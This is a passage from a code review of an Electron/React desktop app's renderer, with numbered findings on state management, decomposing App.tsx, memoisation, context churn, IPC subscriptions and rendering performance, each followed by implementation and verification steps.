   - MAIN-12 steps 1-2 (broadcast rescans to every window);
   - MAIN-10 (`sessionNote`, `cwdExists` memo, debounce bounds);
   - MAIN-5 (drop or ring the replay buffer), then MAIN-6 (pty exit lifecycle);
   - MAIN-8.
2. **Measure, then cut rescan cost:** the MAIN-1 step 1 logging on the real library, then MAIN-2 (one transaction), MAIN-3 (fewer git spawns), MAIN-4 (`refreshProject` for git ops, the biggest user-visible latency win), MAIN-1 (incremental and path-scoped rescans), MAIN-7 (no per-pass note rewrite), MAIN-25.
3. **The contract:** MAIN-22 (move mirrored types to shared), then MAIN-11 steps 1-3 (contract, derived `ApiaryApi` with an equality test, generated preload), then steps 4-6 (typed registrar with guards, which completes MAIN-19 item 4, and typed `emit`).
4. **Structure:** MAIN-16 steps 2-5 (`SettingsService`), then MAIN-13 (split `ipc.ts`: watcher, activity, tab mover, handler modules), then MAIN-15 (env, `WindowManager`, lifecycle), then MAIN-14 (extract services from `AppService` behind the facade, one per PR), then MAIN-23 (shared exec).
5. **Types and extensibility on the new structure:** MAIN-21 (`ptyId` helpers, then `TerminalRef`), MAIN-9 (cheaper `gitStatus` with a `null` outcome), MAIN-17 (open plugin registry and generic ref resolution), MAIN-18 (source seam), MAIN-24, MAIN-26 (measure first).

## Part C: Renderer

Reviewer scope: component architecture, state, modularity, performance, effects, CSS, accessibility,
UI error handling, file layout. Security, main/IPC, tests/tooling and docs are other reviewers' areas
and are only mentioned where a renderer change depends on them.

Method: read CLAUDE.md in full; read App.tsx, Sidebar, SessionTree, SessionRow, SessionColumn,
SessionTabBar, Transcript, MessageRow, MarkdownText, ToolBlock, TerminalView, SettingsDialog,
ThemesSection, BranchSwitcher, ContextMenu, GitMenu, LayoutPicker, LayoutMenuButton, PaneDividers,
PaneFiller, Composer, the dialogs, HoverCard/useHoverCard, useMrStatuses, pluginBar, all of `state/*`,
`theme/*`, `main.tsx`, `index.html`, and styles.css (grepped + read in the relevant ranges). Ran
`npm run typecheck` (passes). A throwaway script
(`scratchpad/css.mjs`) cross-referenced CSS classes against string literals in the renderer. No tests
or builds were run, and no repo file was changed.

---

### Current architecture (summary)

- **Root:** `main.tsx` mounts `NotificationProvider > ErrorBoundary("Apiary") > App` plus
  `NotificationCenter`. There is no `StrictMode`. `tests/component/renderApp.tsx` mounts exactly the
  same tree against `fakeApiary`, so any refactor that keeps `App`'s public shape (no props) is safe to
  do bit by bit.
- **App.tsx (1,622 lines)** owns nearly all window state: **30 `useState`, 27 `useEffect`, 4 `useRef`,
  23 `useCallback`, 3 `useMemo`**, plus 6 custom hooks (`useNotifications`, `useThemeState`,
  `useAppliedTheme`, `useUpdate`, `useActiveTabs`, `usePtySessions`). It renders the Sidebar (36
  props, 21 inline closures) and one `SessionColumn` per pane (34 props, 34 inline closures each).
  `LayoutContext` is the only context apart from notifications.
- **State:** `state/layout.ts` and `state/columns.ts` are pure functions (a preset table, tidyLayout)
  with unit tests (`tests/unit/layout.test.ts`, `columns.test.ts`). Session and pty bookkeeping
  (`openSessions`, `resumed`, `ptyOverrides`, `pending`, `shellTabs`, `activeTerminal`) is held in
  separate `useState` Maps in App. Transitions touch 3 to 6 of them at once through separate setters.
- **Data flow from main:** push events (`onTreeChanged`, `onActiveTabsChanged`, `onPtyData`, and so on)
  are subscribed independently by each consumer. There is no shared renderer store: the tree is
  fetched by `useSessionTreeCache` (Sidebar), by 3 App effects and by `PaneFiller`.
- **Rendering:** there is **no `React.memo` anywhere** in the renderer (grep: 0 hits). No list is
  virtualized. Markdown is memoized per text block (`MarkdownText` `useMemo`).
- **CSS:** one 2,655-line `styles.css`. Tokens at the top, then a control layer, then feature rules in
  the order they were added. There are only 3 `!important`s and 2 unreferenced classes. z-index is
  handled ad hoc (12 distinct values). `no-descending-specificity` is disabled in stylelint.

---

### Findings

#### UI-1: App.tsx is a god component — decompose into hooks + providers

- **Category:** modularity
- **Severity:** high
- **Effort:** L (done as 6 independent S/M steps)
- **Evidence:**
  - State inventory (App.tsx line → name): 125 `ui`, 131 `gpuCompositing`, 136 `noteTarget`,
    142/145/153 `detached`/`arrival`/`restored` (read-once), 168 `windowState`, 223 `tracks`,
    230 `openSessions`, 231 `resumed`, 238 `ptyOverrides`, 245 `pending`, 253 `shellTabs`,
    261 `activeTerminal`, 271 `conflict`, 272 `deleteTarget`, 274 `moveTarget`, 275 `importOpen`,
    282 `settingsSection`, 287–291 five settings mirrors, 337 `treeNonce`, 338/339 `resizing*`,
    792 `requestedPicker`, 795 `movingPane`, 976 `resumeTarget`.
  - Responsibilities, 14 of them: (1) theme/effects wiring (126–132, 1249); (2) per-window UI
    persistence and cross-window sync (383–386); (3) settings mirror (287–305, 1600); (4) window
    layout + focus (168–221, 763–811); (5) opening, closing and focusing tabs (353–381, 1224–1231);
    (6) pending new-session reconciliation by cwd (398–435, 503–559); (7) following Claude's session
    id / rekey (581–666); (8) pty lifecycle (442–483 exit; 1031–1048 `ptyRunning`); (9) restore on
    launch (325–336, 671–699); (10) layout and tab reporting to main with a flush on quit
    (1065–1134); (11) cross-window tab transfer (1173–1217); (12) session actions (fork, resume,
    delete, move, rename, note: 909–1006, 1296–1302, 1428–1433, 1579–1615); (13) three
    mouse-drag resizers (718–756, 1522–1526); (14) six dialogs (1529–1617).
  - Prop drilling: `SessionColumn` receives raw setters `setShellTabs`/`setActiveTerminal`
    (1409–1411) and mutates App's maps directly (SessionColumn.tsx 227–228, 313–314, 326–365).
    `Sidebar` receives 36 props, 11 of them only to write parts of `ui` back (1307–1350).
- **What:** extract, in this order (each one is a pure move that keeps `App` prop-less):
  1. `state/useUiState.ts`: `const [ui, updateUi] = useUiState()` owns load, save, shared-sync
     (383–386) and the `pruneDismissed` effect (312–317). It also exports narrow actions such as
     `togglePin`, `unpin`, `setCollapsed`, `setGroupState`, `reorderPinned`, `toggleAllWorktrees`,
     `dismissRecent`, `setSidebarWidth`, `setBottomHeight`, `setTerminalListWidth`,
     `setImportDialogWidth`.
  2. `state/useAppSettings.ts`: `{ revealActiveInSidebar, recentSectionEnabled, recentSectionHours,
     searchChatContent, searchSessionNotes, reload }` (replaces 287–305).
  3. `features/workspace/WorkspaceProvider.tsx`: owns the reducer from UI-2 (`windowState`,
     `openSessions`, `resumed`, `ptyOverrides`, `pending`, `shellTabs`, `activeTerminal`) and exposes
     `useWorkspace()` (state) and `useWorkspaceActions()` (stable dispatchers). This is what stops
     `setShellTabs`/`setActiveTerminal`/`pending`/`resumed`/`ptyOverrides`/`sessions` being threaded
     into every `SessionColumn`: it reads them itself.
  4. `features/workspace/useSessionFollowing.ts` (the reconciler 503–559 plus the rekey 581–666),
     `usePtyLifecycle.ts` (442–483, 1031–1048), `useLaunchRestore.ts` (325–336, 671–699),
     `useLayoutReporting.ts` (1065–1134), `useTabTransfer.ts` (1173–1217 plus `transferFor`). Each
     reads the workspace through context and dispatches actions.
  5. `features/dialogs/DialogHost.tsx` plus `useDialogs()` context:
     `open({kind:'delete'|'move'|'note'|'conflict'|'import'|'settings', ...})`. This replaces 8
     `useState`s and 90 lines of JSX. Sidebar and columns then call `dialogs.open(...)` instead of
     receiving `onDeleteSession`/`onSessionDropped`/`onEditNote`.
  6. `features/layout/useResizeDrag.ts` (shared with PaneDividers, ImportDialog and
     TerminalListPanel; see UI-6).
  After this, App.tsx should be about 250 lines: providers, the grid, `ThemeEffects`, `Sidebar`, and
  the `columns.map`.
- **Why:** each transition is currently a hand-ordered cluster of setters inside a 1,600-line
  closure scope. Effects depend on 5–6 pieces of state apiece (e.g. 666:
  `[ptySessions, columns, ptyOverrides, pending, notifyError, setColumns]`), so the reason an effect
  re-runs cannot be seen locally. Two of the file's long comments (155–167, 186–194) document bugs
  caused by exactly this split-state ordering.
- **Gain:** logic that can be read and tested per concern; props on Sidebar and SessionColumn drop
  from 36 and 34 to about 10 each; a prerequisite for the memoisation in UI-4.
- **Implementation steps:** one PR per extracted hook, in the order above. Each is a move with no
  behaviour change: cut the state and effects, paste them into the hook, return the same names, and
  replace them in App. Do not change dependency arrays while moving; fix them in separate commits
  (UI-14/UI-15).
- **Verification:** `npm run typecheck`, `npm run lint`, `npm run test:component` (sessionTabs 23,
  paneLayouts 18, multiTerminal 11, newSession, forkSession, pinning, sidebarGroups,
  activeSection) after every step. Then `npm run test:e2e` for restoreWindows, detachTab,
  multiWindow, sessionFollowing and newSession, which cover what the component fake cannot:
  relaunch, second window and real ptys.
- **Constraints:** every layout change still goes through `tidyLayout` (keep `setLayout` as the only
  writer of `layout`). Keep `layout` + `activeColumnId` as one atomic value (App.tsx 155–167).
  Shells stay filed under `keyFor(key)`, not the tab key (CLAUDE.md "Which session a terminal is
  on"). Keep `LayoutContext` so sidebar rows can place without threading.
- **Depends on:** UI-2 for step 3.

#### UI-2: Replace the six bookkeeping `useState`s with one pure `workspaceReducer`

- **Category:** state
- **Severity:** high
- **Effort:** M
- **Evidence:** a rekey is 6 separate setter calls (App.tsx 629–660: `setPtyOverrides`, `setResumed`,
  `setOpenSessions`, `setColumns`, `setPending`). The cwd reconciler is 5 (518–552). Pty exit is 4
  (443–482). Tab adopt is 4 (1177–1192). Delete is 3 (962–969). The file already had to merge
  `layout` and `activeColumnId` into one `useState` because two separately-ordered updates lost focus
  (155–167). The same hazard exists between `ptyOverrides` and `pending`, which the reconciler
  reads from a closure (514: `...ptyOverrides.keys()` "fresh here because resolving an entry
  changes `pending`, which re-creates this effect").
- **What:** `features/workspace/workspaceReducer.ts` (pure, no React, no `window`):

  ```ts
  interface WorkspaceState {
    layout: Layout; activeColumnId: string | null; tracks: Map<PresetId, Tracks>
    openSessions: Map<string, SessionNode>; resumed: Set<string>
    ptyOverrides: Map<string, string>; pending: Map<string, PendingSession>
    shellTabs: Map<string, TerminalTab[]>; activeTerminal: Map<string, string>
  }
  type WorkspaceAction =
    | { type: 'session/open'; session: SessionNode; split: boolean }
    | { type: 'tab/activate' | 'tab/close'; columnId: string; key: string }
    | { type: 'tab/setView'; key: string; view: OpenTab['view'] }
    | { type: 'tab/move'; key: string; toColumnId: string; toIndex: number }
    | { type: 'tab/adopt'; transfer: TabTransfer }
    | { type: 'pending/add'; info: NewSessionInfo; knownIds: Set<string>; after?: string; titleOverride?: string }
    | { type: 'pending/title'; ptyId: string; title: string }
    | { type: 'session/follow'; from: string; to: SessionNode; ptyId: string }  // rekey + reconcile
    | { type: 'pty/exited'; id: string }
    | { type: 'pty/running'; keys: string[] }
    | { type: 'session/removed'; sessionId: string }
    | { type: 'shell/add' | 'shell/rename' | 'shell/remove' | 'shell/reorder' | 'shell/activate'; ... }
    | { type: 'layout/apply' | 'layout/place' | 'layout/split' | 'layout/closePane' | 'layout/swap' | 'layout/tracks'; ... }
  ```

  Every layout-touching case ends in `tidyLayout(...)`. Side effects (IPC such as `renameSession`,
  `logWrite`) stay in the hooks from UI-1, which dispatch after deciding. Expose it through two
  contexts: `WorkspaceStateContext` (value = state) and `WorkspaceDispatchContext` (value = the
  stable `dispatch`).
  **Recommendation vs. alternatives:** use `useReducer` + 2 contexts, not zustand. The project has
  deliberately no state library, all of this state is per-window and lives in one root, and the
  benefit that matters here is *atomic, pure, Node-testable transitions*, which a reducer gives with
  no dependency. For *main-process push data* read by many leaves (tree, activeTabs, ptySessions, MR
  statuses) use small `useSyncExternalStore` module stores instead (UI-3, UI-10). There the gain is
  one subscription and per-selector re-renders, which a reducer does not give.
- **Why:** it removes the ordering class of bugs by construction. The transitions (rekey,
  reconcile, pty exit, adopt) become unit-testable in `tests/unit` the way `layout.test.ts` is, when
  today they can only be reached through a mounted App or e2e.
- **Gain:** about 300 lines of App effects become about 150 lines of pure reducer cases with
  table-driven tests. `session/follow` is written once instead of twice (the reconciler 529–552 and
  the rekey 622–660 do the same four updates).
- **Implementation steps:** (1) Write the reducer and `tests/unit/workspaceReducer.test.ts` by
  porting today's exact semantics: pty-exit closes only `new:` tabs (455), shells follow
  `keyFor` (647–649), and a rekey keeps the tab on the terminal view (650–654). (2) In App, replace
  the six `useState`s with `useReducer(workspaceReducer, init(restored, arrival))`, keeping the
  existing setter names as thin wrappers that dispatch. (3) Migrate call sites one transition at a
  time. (4) Delete the wrappers.
- **Verification:** new unit tests; `npm run test:component` (sessionTabs, paneLayouts,
  multiTerminal, newSession, forkSession, renameSession); e2e `sessionFollowing.spec.ts`,
  `restoreWindows.spec.ts`, `detachTab.spec.ts`, `multiWindow.spec.ts`; and the live spec if possible
  (`APIARY_LIVE_CLAUDE=1 npm run test:e2e -- live/`), which is what caught the rekey regression
  before.
- **Constraints:** "Never spawn over a live id": the reducer must not trigger spawns. Keep
  `buildPersistedLayout` (shared) as the persistence projection. Placing moves and splitting copies
  (layout.ts `placeInZone` vs `openBeside`).
- **Depends on:** none (can precede UI-1 step 3).

#### UI-3: One renderer-side tree store — today each watcher tick fetches the full tree 3–5 times

- **Category:** performance
- **Severity:** high
- **Effort:** M
- **Evidence:** `window.apiary.tree()` is called at 10 sites (grep). On one `treeChanged` push:
  `useSessionTreeCache.ts:26` reloads; `App.tsx:885` refreshes `openSessions`; `App.tsx:557`
  (reconciler, while anything is pending) and `App.tsx:664` (rekey, whenever `ptySessions` is
  non-empty, i.e. any live Claude) fetch again. That is **3–4 full-tree IPC round trips per
  window per change**, and `onTreeChanged` fires about every 1 s while Claude writes (Transcript.tsx
  202 "debounced ~1s"). The rekey effect also re-subscribes and **fetches immediately on every
  `columns` change** (deps at 666 include `columns`), so every tab click costs a full tree fetch.
  `PaneFiller.tsx:36` fetches its own copy. `Sidebar key={treeNonce}` (App 1289, 1591) remounts the
  whole sidebar after an import, throwing away the search text and scroll position that the
  `hidden` prop (1290–1291) exists to keep.
- **What:** promote `useSessionTreeCache` to a module store, `state/treeStore.ts`, with one
  `onTreeChanged` subscription, `getSnapshot()`, `reload()`/`reloadNow()`, and derived memoised
  lookups (`byId: Map<string, SessionNode>`, `idSet`) computed once per tree version. Hooks:
  `useTree()`, `useSessionById(id)`, `useTreeVersion()`. App's three effects read the store
  snapshot in their `check` instead of calling `tree()`. `PaneFiller` reads `useTree()`. Replace
  `key={treeNonce}` with `treeStore.reload()` in `onImported`. In the rekey effect, depend on
  `openKeysSignature` (already computed at 1030) instead of `columns`.
- **Why:** each fetch serialises the whole library (thousands of `SessionNode`s) across IPC and
  walks it (`findSessionById` is recursive per open tab, 892). Main does the work again for each
  call.
- **Gain:** 1 tree fetch per change instead of 3–5, and 0 per tab click (today 1). The sidebar
  keeps its state across an import.
- **Implementation steps:** (1) Create `treeStore.ts` around the existing
  `useSessionTreeCache` logic, keeping its `latest` request-id guard. (2) Make
  `useSessionTreeCache` a thin wrapper, so `useTree`/Sidebar are unchanged. (3) Change App 885, 507
  and 588 to `const nodes = await treeStore.current()` (resolves with the in-flight or latest
  snapshot). (4) PaneFiller. (5) Remove `treeNonce`.
- **Verification:** `npm run test:component` (sidebar, search, newSession, forkSession,
  renameSession, import: "imported sessions appear without remount"). Add a component test
  asserting `fake.calls.tree` increments by 1 per `emitTreeChanged()` (the fake records every call,
  per CLAUDE.md). e2e `sessionFollowing.spec.ts`.
- **Constraints:** CLAUDE.md "Filtering… runs in the renderer against a cached tree… refreshes it
  only on an explicit reload or the watcher's change signal". This extends that decision to every
  consumer; it does not change it. The rekey must still re-check on tree changes (App 584–587).
- **Depends on:** none.

#### UI-4: Zero `React.memo` — the whole window re-renders at up to 2 Hz while any pty prints

- **Category:** performance
- **Severity:** high
- **Effort:** M
- **Evidence:** grep finds no `memo(` in the renderer. `useActiveTabs.ts:11` calls `setTabs(next)`
  with a fresh array on every `activeTabsChanged`. Main broadcasts that on pty output, coalesced to
  `ACTIVITY_BROADCAST_MS = 500` (src/main/ipc.ts 32, 657–666), so **while Claude or a dev server is
  printing, App re-renders twice a second**. Each App render rebuilds `new Set(ui.collapsed)` (1333),
  `groupState` (1307), `pinnedKeys` (343), `pendingTabInfo` (1233), `layoutActions` (797) and about
  55 inline closures, then re-renders: `Sidebar` → every `SessionTree` → every `SessionRow` (each
  with `useHoverCard`, 2× `useMrStatuses`, `useLayoutActions`, `useNotifications`) → every column →
  `Transcript` → every `MessageRow` (TextBlock re-splits lines; `summarise` re-runs
  `JSON.stringify(input, null, 2)` for every tool call, MessageRow.tsx 42–48, 87) → every
  `TerminalView` (rebuilds its menu items and calls `getSelection()`, TerminalView.tsx 316).
- **What:** (a) `useActiveTabs`: keep the previous array when the new one is shallow-equal on
  `windowNumber/key/status/label/ptyId`. (b) `React.memo` on `SessionRow`, `FolderHeader`,
  `SessionTree`, `MessageRow`, `ToolBlock`, `TerminalView`, `SessionTabBar`, `Sidebar`,
  `SessionColumn`. (c) Make the props they get stable: `useCallback` for App's handlers (most exist
  already; the JSX lambdas at 1295–1363 and 1413–1480 need hoisting, or better, go away with UI-1
  context actions), `useMemo` for `collapsedSet`, `groupState`, `pinnedKeys`, `pendingTabInfo`,
  and `treeProps` in Sidebar (487). (d) Fix the context churn in UI-5 first, because
  `useLayoutActions()`/`useNotifications()` inside `SessionRow` bypass `memo`.
- **Why:** the cost grows with library size × transcript length × open terminals, and it is paid
  at the moment the user is watching a busy session, which is when input latency matters most. The
  existing `themePerf` bench measures hover, scroll and typing while effects run, so this will
  show there.
- **Gain:** idle re-render of a window with N sidebar rows and M messages goes from O(N+M) twice a
  second to O(changed rows). Measure it rather than assume: React Profiler "commits per second" and
  `tests/e2e/bench/themePerf.spec.ts` (`APIARY_BENCH=1`) before and after.
- **Implementation steps:** (1) equality guard in `useActiveTabs` (S). (2) UI-5. (3) `memo(MessageRow)`:
  `mergeLatestPage` already preserves object identity for existing messages (Transcript.tsx 43), and
  `onOpenImage` is a `setState` (stable), so this is a one-line win. (4) memo the sidebar rows plus
  `useCallback`/`useMemo` the props in Sidebar and App. (5) memo `TerminalView` (props are strings
  and booleans; `onRenameKey` is already read through a ref, 70–71).
- **Verification:** `npm run test:component` (all). Add a Profiler-based component test: render
  App with 200 fake sessions, emit 10 `activeTabsChanged`, and assert `SessionRow` render count
  stays flat (use a `vi.fn` wrapped in `<Profiler onRender>`). Run `npm run test:e2e -- bench/`
  with `APIARY_BENCH=1`.
- **Constraints:** do not memoise away `SessionRow`'s reaction to `selected` or `pinned`.
  `SearchField` must stay the only per-keystroke renderer (SearchField.tsx 17–27).
- **Depends on:** UI-5; easier after UI-1.

#### UI-5: Context values that change on every render or every toast

- **Category:** performance
- **Severity:** high
- **Effort:** S
- **Evidence:**
  - `state/notifications.tsx:141–144`: the context value is
    `useMemo(() => ({ notify, notifyError, dismiss, dismissAll, items }), [..., items])`. Every toast
    shown or dismissed (auto-dismiss timers at 96) gives every `useNotifications()` consumer a new
    value: App, Sidebar, `useTree`, every `SessionRow` (93), every `FolderHeader` (SessionTree.tsx
    167), SessionColumn, Composer, ThemesSection, UpdateBanner. Only `NotificationCenter` reads
    `items`.
  - `App.tsx:797–811`: `layoutActions` is a fresh object literal every App render. `isOpen`
    (802) closes over `columns` and `dropPaneOn` (807) over `movingPane`, so every
    `useLayoutActions()` consumer (each `SessionRow` 92, `SessionTabBar` 104, `LayoutMenuButton` 32,
    `SessionColumn` 434, Sidebar 198) re-renders on every App render.
- **What:** split notifications into `NotifyContext` (stable
  `{notify, notifyError, dismiss, dismissAll}`) and `NotificationItemsContext` (`items`). Keep
  `useNotifications()` returning the actions and add `useNotificationItems()` for
  `NotificationCenter`. Split `LayoutContext` into `LayoutActionsContext` (stable callbacks via
  `useCallback`; `isOpen` reads a ref holding the current open-key set) and `LayoutStateContext`
  (`preset`, `paneCount`, `movingPane`). In `SessionRow`, compute the picker heading lazily
  (pass a function, or compute inside `LayoutMenuButton` when it opens) so rows do not depend on
  `isOpen` at render.
- **Why:** these contexts sit above the largest lists in the app, so any memo work (UI-4) is void
  while they churn.
- **Gain:** a toast no longer re-renders the sidebar, and an App render no longer re-renders every
  row.
- **Implementation steps:** (1) notifications split (mechanical; `useNotifications` keeps its
  signature minus `items`, and only `NotificationCenter` changes). (2) Layout context split, with
  `useLayoutActions()` still returning the merged object for compatibility, then migrate consumers
  to the narrow hooks.
- **Verification:** `npm run test:component` (errorReporting, sidebarPopups, paneLayouts: pane
  swap uses `movingPane`, sessionTabs). typecheck.
- **Constraints:** CLAUDE.md: "The pickers are fed through `LayoutContext`, so a sidebar row can
  place a session without the layout being threaded". Keep a context and just make it stable.
- **Depends on:** none.

#### UI-6: Drag resizers re-render the whole App and write localStorage on every mousemove

- **Category:** performance
- **Severity:** medium
- **Effort:** S–M
- **Evidence:** sidebar drag (App.tsx 721–724) calls `setUi` per mousemove, and
  `useEffect(() => { saveUiState(ui) }, [ui])` (383) then does **2 synchronous `localStorage.setItem`
  and 2 `JSON.stringify` of the whole UiState per mousemove** (uiState.ts 208–212). The bottom-pane drag
  is the same (746). Pane dividers call `setTracks` per mousemove (PaneDividers.tsx 36–45 →
  App 1525), which re-renders App and therefore the whole tree (UI-4). `ImportDialog`'s drag effect
  depends on `onWidthChange`, an inline App lambda (1593), so it tears down and re-adds its window
  listeners on every mousemove render (ImportDialog.tsx 91–106). The drag pattern (body class,
  window listeners, clamp) is written 5 times: App ×2, PaneDividers, ImportDialog, TerminalListPanel.
- **What:** a `useResizeDrag({ axis, onMove, onEnd, cursor })` hook that holds callbacks in a ref,
  so listeners bind once per drag. During the drag, write the live value to a CSS custom property on
  the grid element (`--sidebar-width`, `--bottom-height`, or the grid template for tracks) and
  commit to React state/UiState once on `mouseup`. Debounce `saveUiState` (e.g. 250 ms trailing)
  regardless.
- **Why:** CLAUDE.md records that a divider drag was a benchmarked hot path for effects (ThemeEffects
  holds its frame while `resizing-active`). The React side of the same drag was never taken off it.
- **Gain:** O(1) work per mousemove instead of a full re-render plus 2 storage writes.
- **Implementation steps:** (1) hook plus `saveUiState` debounce; (2) migrate App's two drags; (3)
  PaneDividers (keep `dragTracks` pure; apply `trackTemplate` to `content.style` during the drag);
  (4) ImportDialog and TerminalListPanel.
- **Verification:** component `paneLayouts.test.tsx` (divider tests), `uiPolish`, `import.test.tsx`
  (width drag); e2e `restoreWindows.spec.ts` (sidebar width persisted); bench "divider drag" in
  `themePerf.spec.ts`.
- **Constraints:** keep the `resizing-active`/`resizing-col|row` body classes. ThemeEffects reads
  `resizing-active` (ThemeEffects.tsx 115), and CSS uses the others for the cursor (541–542).
- **Depends on:** none.

#### UI-7: `useHoverCard` does O(rows) work on every wheel event

- **Category:** performance
- **Severity:** medium
- **Effort:** S
- **Evidence:** every hook instance registers a scroll listener unconditionally on mount
  (useHoverCard.ts 242–259, `scrollListeners.add(onScroll)`). Instances exist for every
  `SessionRow`, every `FolderHeader` and every `LayoutMenuButton` (the split button in each row,
  LayoutMenuButton.tsx 34). So with N rows there are about 2N listeners. Each scroll event runs 2N
  closures that each `clearTimeout`, call `setAnchor(null)` and **arm a new `setTimeout`** (250).
  When the scroll settles, 2N timers fire and each calls `pointerIsOver` →
  `getBoundingClientRect()` (75–80).
- **What:** keep one module-level "armed or open" instance instead of broadcasting to all. On
  scroll, close only `openCard` and cancel only the armed instance's timer. After the quiet period,
  use `document.elementFromPoint(pointer.x, pointer.y)` once and reopen only the instance whose
  `ref` contains that element (a `WeakMap<Element, instance>` registry).
- **Why:** a sidebar with 1,000 sessions queues about 2,000 timers per wheel notch, while the
  sidebar is the element being scrolled.
- **Gain:** O(1) per scroll event.
- **Implementation steps:** replace `scrollListeners: Set` with a registry keyed by element. Only
  hooks that are armed or open subscribe (add in `arm`/`openNow`, remove on close or unmount).
- **Verification:** component `sidebarPopups.test.tsx` (8 tests on card stacking and scroll), e2e
  `sidebarPopups.spec.ts`, `sidebarBranch.spec.ts` (the reflow-under-pointer test cited at
  useHoverCard.ts 140).
- **Constraints:** keep the one-card rule, the warm delay and the reflow tolerance. All three are
  documented with the bugs they fixed.
- **Depends on:** none.

#### UI-8: Transcript: memo rows, bound the list, precompute tool summaries

- **Category:** performance
- **Severity:** medium
- **Effort:** S
- **Evidence:** `visibleMessages.map(... <MessageRow/>)` (Transcript.tsx 332–339) with no memo.
  Each live refresh `setMessages(prev => mergeLatestPage(prev, ...))` (226) re-renders every row.
  `TextBlock` re-splits the text and runs the image regex per render (MessageRow.tsx 17–27).
  `summarise(block.input)` runs `JSON.stringify(…, null, 2)` per `tool_use` per render (42–48, 87).
  `ToolBlock` recomputes `detail.split('\n')` per render (ToolBlock.tsx 12). The list only grows: 200
  per page (transcriptReader `DEFAULT_LIMIT = 200`), plus every live append, plus every "Load
  earlier", with no cap. `mergeLatestPage` falls back to `JSON.stringify` equality for empty uuids
  (34). `visibleMessages` is recomputed by a filter each render (272).
- **What:** `export const MessageRow = memo(function MessageRow…)`; `useMemo` the segments in
  `TextBlock` and the first line in `ToolBlock`; `useMemo` `visibleMessages` on
  `[messages, showSidechain]`; move `summarise` into a memoised `ToolUseBlock`. Optionally add
  `content-visibility: auto; contain-intrinsic-size: auto 120px` on `.message`, but only after
  checking that stick-to-bottom (Transcript.tsx 152–167, 181–191) still lands on the last message,
  because intrinsic-size estimates change `scrollHeight`. Move `mergeLatestPage` to
  `state/transcriptMerge.ts` and unit-test it (it has no test today; grep).
- **Why:** a long live session means thousands of rows re-rendered once per second.
- **Gain:** an append becomes O(appended).
- **Implementation steps:** as listed. Each is independent.
- **Verification:** component `transcript.test.tsx` (9 tests incl. paging, markdown, chevron
  position), e2e `transcript.spec.ts`, new `tests/unit/transcriptMerge.test.ts`.
- **Constraints:** DOMPurify stays on every markdown path (MarkdownText.tsx). Keep index-key
  fallbacks as documented.
- **Depends on:** none.

#### UI-9: Sidebar list size: measure, then `content-visibility` before virtualization

- **Category:** performance
- **Severity:** medium
- **Effort:** M
- **Evidence:** folders are open by default ("Anything NOT in this list is open", uiState.ts 7–12),
  and `SessionTree` renders every session of every open folder (SessionTree.tsx 67–135). Each
  `SessionRow` mounts about 8 effects (useHoverCard ×3 effects, useMrStatuses ×2 × 2 effects,
  vsCode effect at 96–99) and 5 buttons.
- **What:** step 1: CSS only, `li[data-testid="project-group"] { content-visibility: auto;
  contain-intrinsic-size: auto 28px; }` plus the same on `.session-row-wrap`, which skips
  layout and paint offscreen while keeping the DOM (tests and reveal keep working). Step 2, only if
  mount time is still measured as a problem: windowing with `@tanstack/react-virtual` over a
  flattened row model.
- **Why:** full virtualization collides with four existing behaviours: reveal-and-scroll
  (Sidebar.tsx 231–247 queries `[data-session-id=…]`, which must exist), hover-card measurement,
  drag-and-drop targets on folder rows, and e2e/component tests that locate off-screen rows by test
  id. `content-visibility` has none of those costs.
- **Gain:** cheaper layout and paint on large libraries with zero behaviour change. Measure with a
  2,000-session fake (the fake can be parameterised) and the Performance panel.
- **Implementation steps:** (1) add a `FakeOptions.sessionCount` to `fakeApiary` for a perf
  fixture; (2) record mount time and scroll FPS; (3) CSS rule; (4) re-measure; (5) decide on
  windowing.
- **Verification:** component `sidebar*`, `search`, `pinning`; e2e `sidebar*.spec.ts`; bench scroll.
- **Constraints:** `.sidebar-frame` carries the glass pane (CLAUDE.md), so do not put containment on
  it. No `backdrop-filter`.
- **Depends on:** UI-4 (memo) should land first so re-render cost is not confused with mount cost.

#### UI-10: Per-instance subscriptions and polling that should be shared

**Lead review:** The main-side half (targeted or coalesced `ptyData`) is MAIN-26.

- **Category:** performance
- **Severity:** low
- **Effort:** M
- **Evidence:**
  - `useMrStatuses.ts 29–35`: every row whose title or note contains `!<iid>` owns a 2-minute
    `setInterval` and an `onMrStatusesInvalidated` IPC listener, and SessionRow calls it twice (title
    and note, 103–104). Each tick is one `gitlabMrRefStatus` IPC per row.
  - `TerminalView.tsx 127–131, 166`: each terminal adds its own `onPtyData` and `onPtyExit`
    `ipcRenderer.on` listener and filters by id. Preload wraps each subscription in its own
    `ipcRenderer.on` (src/preload/index.ts 9). Every tab's claude terminal and every shell stay
    mounted by design (SessionColumn.tsx 560–578, 705–738), so 10 tabs × 3 terminals means 30 listeners on
    `ptyData`. That is past Node EventEmitter's default of 10, so a `MaxListenersExceededWarning` in the
    renderer console is likely. I have not observed it; check in devtools. `onTreeChanged` has 6
    subscription sites plus one per mounted Transcript.
  - `SessionColumn.tsx 171–177`: each pane polls `gitStatus` every 5 s while the window is focused
    (4 panes means 4 local git calls per 5 s). This is documented and acceptable; it is noted here
    only because of the race in UI-14.
- **What:** `state/ptyBus.ts`, a single `onPtyData`/`onPtyExit` subscription dispatching by id
  (`Map<id, Set<cb>>`), used by `TerminalView` and App's exit handler. `state/mrStatusStore.ts`, one
  timer and one invalidation listener, batching all mounted `(sessionId, iids)` into one request
  per tick.
- **Why:** it scales linearly with open terminals and rows for no benefit.
- **Gain:** one IPC listener per channel, and one MR request per tick instead of one per row.
- **Implementation steps:** (1) ptyBus with an identical callback signature; swap TerminalView to it.
  (2) mrStatusStore via `useSyncExternalStore`.
- **Verification:** component `terminal`, `multiTerminal`, `activeSection`; e2e `terminal.spec.ts`,
  `mrStatus.spec.ts`, `multiTerminal.spec.ts`.
- **Constraints:** TerminalView's snapshot → drain → fit ordering (CLAUDE.md "Windows, and what
  belongs to which") must be untouched. The bus changes only where the chunk comes from.
- **Depends on:** none.

#### UI-11: `useAllWorktrees` re-lists worktrees on every tree change

- **Category:** performance
- **Severity:** low
- **Effort:** S
- **Evidence:** `useAllWorktrees.ts:23` has deps `[key, tree]`, and Sidebar passes `rawTree` (Sidebar.tsx
  305), so every `treeChanged` (about 1/s during an active session) runs `listWorktrees` (a git
  process in main) for every folder in `showAllWorktrees`.
- **What:** depend on `key` plus a signature of the present top-level paths
  (`tree.map(n=>n.path).join('\n')`), not the tree object.
- **Gain:** K git calls per actual folder-set change instead of per second.
- **Verification:** component `allWorktrees.test.tsx`, e2e `allWorktrees.spec.ts`.
